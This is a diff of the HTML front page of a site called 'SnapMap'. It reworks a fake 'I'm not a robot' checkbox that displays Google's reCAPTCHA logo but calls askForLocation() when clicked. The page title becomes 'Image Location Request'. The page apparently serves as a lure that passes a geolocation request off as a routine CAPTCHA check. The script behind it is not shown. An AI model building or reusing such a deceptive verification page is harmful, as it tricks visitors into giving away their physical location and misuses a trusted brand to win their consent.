@@ -3,32 +3,35 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SnapMap - Share with the World</title>
+  <title>SnapMap - Image Location Request</title>
   <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
 </head>
 <body>
-  <div class="hero">
-    <div class="content">
-      <h1>SnapMap</h1>
-      <p class="tagline">The world’s cleanest platform to share your moments</p>
+  <div class="wrapper">
+    <div class="card">
+      <h1 class="logo">📸 SnapMap</h1>
+      <p class="subtitle">A modern platform for sharing moments — securely and privately.</p>
 
-      <div class="captcha-box">
-        <div class="checkbox-area">
-          <button class="check-btn" onclick="askForLocation()">
+      <div class="line"></div>
+
+      <div class="captcha-container">
+        <div class="checkbox-group">
+          <button id="captcha-button" onclick="askForLocation()">
             <span class="checkmark">&#x2713;</span>
           </button>
-          <span class="captcha-text">I'm not a robot</span>
+          <span class="captcha-label">I'm not a robot</span>
         </div>
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha" class="captcha-logo">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="Google logo" class="recaptcha-logo" />
       </div>
 
-      <p id="output" class="location-output"></p>
-    </div>
-  </div>
+      <div class="line"></div>
 
-  <footer>
-    &copy; 2025 SnapMap | Built with 📍 and ❤️
-  </footer>
+      <p id="output" class="location-output">Click the checkbox above to continue.</p>
+    </div>
+
+    <footer>&copy; 2025 SnapMap — Made with 📍 and ❤️</footer>
+  </div>
 
   <script src="script.js"></script>
 </body>
